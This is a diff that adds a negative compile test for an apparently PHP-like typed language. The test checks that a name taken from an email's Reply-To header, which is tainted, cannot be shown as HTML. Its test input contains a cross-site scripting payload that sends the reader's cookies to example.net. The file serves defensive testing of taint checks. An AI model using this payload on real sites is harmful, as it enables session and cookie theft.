@@ -1,0 +1,14 @@
+<?nvs
+// Attack: a visitor writes a `<script>` tag as their name in `Reply-To`, and a page shows the name as HTML.
+// The name is tainted, and tainted text is not HTML. So this program should not compile.
+// hostile: expect-refusal
+
+use Core\Html\Markup;
+use Core\Mail\Message;
+
+// 1. The name is a script that sends the reader's cookies to another site.
+Message $mail = Message::parse(
+    "Reply-To: \"<script>fetch('https://example.net/?c=' + document.cookie)</script>\" <x@example.net>\r\n\r\nHi"
+);
+Markup $page = $mail->replyTo()[0]->name();
+echo $page, "\n";
